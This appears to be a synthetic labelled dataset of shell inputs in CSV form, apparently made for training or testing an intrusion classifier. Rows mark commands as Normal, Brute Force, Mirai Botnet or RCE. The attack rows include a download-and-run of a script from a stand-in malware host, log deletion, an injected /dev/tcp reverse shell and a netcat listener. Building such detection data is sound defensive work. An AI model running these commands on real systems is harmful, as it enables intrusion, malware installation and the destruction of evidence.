timestamp,src_ip,input,label
2026-01-08T10:46:17.307501,192.168.1.148,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.99,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.193,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.32,password,Brute Force
2026-01-08T10:46:17.310501,192.168.1.82,support,Brute Force
2026-01-08T10:46:17.306501,192.168.1.219,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.11,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.160,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.63,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.93,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.69,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.65,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.187,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.96,id,Normal
2026-01-08T10:46:17.306501,192.168.1.78,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.85,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.183,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.83,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.13,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.235,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.122,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.149,id,Normal
2026-01-08T10:46:17.310501,192.168.1.21,123456,Brute Force
2026-01-08T10:46:17.307501,192.168.1.106,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.177,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.125,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.120,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.8,support,Brute Force
2026-01-08T10:46:17.312501,192.168.1.118,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.307501,192.168.1.187,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.84,ls,Normal
2026-01-08T10:46:17.311501,192.168.1.145,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.49,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.13,root,Brute Force
2026-01-08T10:46:17.306501,192.168.1.83,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.107,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.151,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.9,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.190,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.198,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.308503,192.168.1.133,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.82,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.226,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.182,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.23,password,Brute Force
2026-01-08T10:46:17.306501,192.168.1.227,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.219,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.169,id,Normal
2026-01-08T10:46:17.307501,192.168.1.29,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.61,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.77,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.71,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.83,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.251,id,Normal
2026-01-08T10:46:17.306501,192.168.1.53,ls,Normal
2026-01-08T10:46:17.311501,192.168.1.24,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.243,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.55,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.161,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.84,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.210,123456,Brute Force
2026-01-08T10:46:17.311501,192.168.1.48,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.195,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.55,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.86,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.160,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.235,password,Brute Force
2026-01-08T10:46:17.309502,192.168.1.36,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.8,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.235,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.231,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.238,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.174,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.249,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.107,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.1,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.188,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.217,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.307501,192.168.1.192,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.228,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.308503,192.168.1.3,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.158,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.208,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.179,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.34,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.247,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.152,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.10,pwd,Normal
2026-01-08T10:46:17.309502,192.168.1.228,root,Brute Force
2026-01-08T10:46:17.310501,192.168.1.130,admin,Brute Force
2026-01-08T10:46:17.306501,192.168.1.189,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.156,password,Brute Force
2026-01-08T10:46:17.306501,192.168.1.183,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.157,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.90,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.251,123456,Brute Force
2026-01-08T10:46:17.310501,192.168.1.206,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.66,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.309502,192.168.1.103,admin,Brute Force
2026-01-08T10:46:17.309502,192.168.1.184,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.200,exit,Normal
2026-01-08T10:46:17.307501,192.168.1.123,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.29,support,Brute Force
2026-01-08T10:46:17.310501,192.168.1.173,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.171,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.247,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.193,123456,Brute Force
2026-01-08T10:46:17.311501,192.168.1.52,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.95,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.139,password,Brute Force
2026-01-08T10:46:17.307501,192.168.1.151,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.101,id,Normal
2026-01-08T10:46:17.311501,192.168.1.190,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.179,exit,Normal
2026-01-08T10:46:17.308503,192.168.1.149,id,Normal
2026-01-08T10:46:17.311501,192.168.1.189,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.90,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.176,nc -lvp 4444,RCE
2026-01-08T10:46:17.312501,192.168.1.90,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.310501,192.168.1.63,123456,Brute Force
2026-01-08T10:46:17.312501,192.168.1.69,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.218,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.211,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.35,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.310501,192.168.1.239,root,Brute Force
2026-01-08T10:46:17.308503,192.168.1.70,cat /etc/issue,Normal
2026-01-08T10:46:17.308503,192.168.1.156,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.212,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.47,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.75,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.22,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.168,123456,Brute Force
2026-01-08T10:46:17.308503,192.168.1.253,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.26,ls,Normal
2026-01-08T10:46:17.309502,192.168.1.111,support,Brute Force
2026-01-08T10:46:17.311501,192.168.1.162,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.237,id,Normal
2026-01-08T10:46:17.310501,192.168.1.182,admin,Brute Force
2026-01-08T10:46:17.310501,192.168.1.17,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.105,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.159,root,Brute Force
2026-01-08T10:46:17.309502,192.168.1.167,admin,Brute Force
2026-01-08T10:46:17.311501,192.168.1.241,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.178,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.310501,192.168.1.40,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.132,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.78,pwd,Normal
2026-01-08T10:46:17.312501,192.168.1.143,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.312501,192.168.1.44,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.311501,192.168.1.66,/bin/busybox cat /proc/mounts,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.143,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.238,pwd,Normal
2026-01-08T10:46:17.306501,192.168.1.107,id,Normal
2026-01-08T10:46:17.311501,192.168.1.207,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.61,id,Normal
2026-01-08T10:46:17.310501,192.168.1.171,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.109,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.215,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.7,exit,Normal
2026-01-08T10:46:17.307501,192.168.1.243,uname -a,Normal
2026-01-08T10:46:17.308503,192.168.1.197,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.172,id,Normal
2026-01-08T10:46:17.308503,192.168.1.27,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.175,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.306501,192.168.1.59,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.116,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.26,exit,Normal
2026-01-08T10:46:17.310501,192.168.1.219,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.242,exit,Normal
2026-01-08T10:46:17.307501,192.168.1.29,cat /etc/issue,Normal
2026-01-08T10:46:17.309502,192.168.1.56,root,Brute Force
2026-01-08T10:46:17.310501,192.168.1.124,123456,Brute Force
2026-01-08T10:46:17.309502,192.168.1.135,support,Brute Force
2026-01-08T10:46:17.312501,192.168.1.242,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.312501,192.168.1.141,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.309502,192.168.1.178,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.17,id,Normal
2026-01-08T10:46:17.309502,192.168.1.193,id,Normal
2026-01-08T10:46:17.307501,192.168.1.100,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.139,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.5,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.5,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.312501,192.168.1.75,; /bin/sh -i >& /dev/tcp/10.0.0.1/8080 0>&1,RCE
2026-01-08T10:46:17.311501,192.168.1.146,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.125,ls,Normal
2026-01-08T10:46:17.310501,192.168.1.242,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.121,exit,Normal
2026-01-08T10:46:17.307501,192.168.1.49,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.241,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.157,ls,Normal
2026-01-08T10:46:17.307501,192.168.1.157,uname -a,Normal
2026-01-08T10:46:17.307501,192.168.1.14,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.49,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.93,pwd,Normal
2026-01-08T10:46:17.308503,192.168.1.216,ls,Normal
2026-01-08T10:46:17.306501,192.168.1.46,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.79,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.307501,192.168.1.90,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.178,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.310501,192.168.1.211,support,Brute Force
2026-01-08T10:46:17.307501,192.168.1.35,uname -a,Normal
2026-01-08T10:46:17.309502,192.168.1.12,root,Brute Force
2026-01-08T10:46:17.311501,192.168.1.159,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.110,exit,Normal
2026-01-08T10:46:17.311501,192.168.1.206,rm -rf /var/log,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.25,id,Normal
2026-01-08T10:46:17.311501,192.168.1.77,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.110,uname -a,Normal
2026-01-08T10:46:17.311501,192.168.1.242,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.311501,192.168.1.97,./bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.238,exit,Normal
2026-01-08T10:46:17.309502,192.168.1.247,123456,Brute Force
2026-01-08T10:46:17.307501,192.168.1.245,cat /etc/issue,Normal
2026-01-08T10:46:17.312501,192.168.1.182,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.217,id,Normal
2026-01-08T10:46:17.307501,192.168.1.120,cat /etc/issue,Normal
2026-01-08T10:46:17.306501,192.168.1.60,cat /etc/issue,Normal
2026-01-08T10:46:17.311501,192.168.1.13,wget http://malware.host/bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.232,id,Normal
2026-01-08T10:46:17.309502,192.168.1.221,ls,Normal
2026-01-08T10:46:17.308503,192.168.1.142,uname -a,Normal
2026-01-08T10:46:17.310501,192.168.1.183,admin,Brute Force
2026-01-08T10:46:17.306501,192.168.1.31,pwd,Normal
2026-01-08T10:46:17.310501,192.168.1.140,root,Brute Force
2026-01-08T10:46:17.312501,192.168.1.108,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.306501,192.168.1.245,exit,Normal
2026-01-08T10:46:17.307501,192.168.1.121,pwd,Normal
2026-01-08T10:46:17.307501,192.168.1.151,ls,Normal
2026-01-08T10:46:17.312501,192.168.1.104,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.308503,192.168.1.197,id,Normal
2026-01-08T10:46:17.308503,192.168.1.4,pwd,Normal
2026-01-08T10:46:17.311501,192.168.1.17,chmod +x bin.sh,Mirai Botnet
2026-01-08T10:46:17.308503,192.168.1.252,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.238,nc -lvp 4444,RCE
2026-01-08T10:46:17.308503,192.168.1.155,cat /etc/issue,Normal
2026-01-08T10:46:17.307501,192.168.1.103,uname -a,Normal
2026-01-08T10:46:17.312501,192.168.1.90,"python -c ""import socket,subprocess,os;...""",RCE
2026-01-08T10:46:17.306501,192.168.1.169,id,Normal
2026-01-08T10:46:17.309502,192.168.1.28,root,Brute Force
2026-01-08T10:46:17.307501,192.168.1.181,pwd,Normal
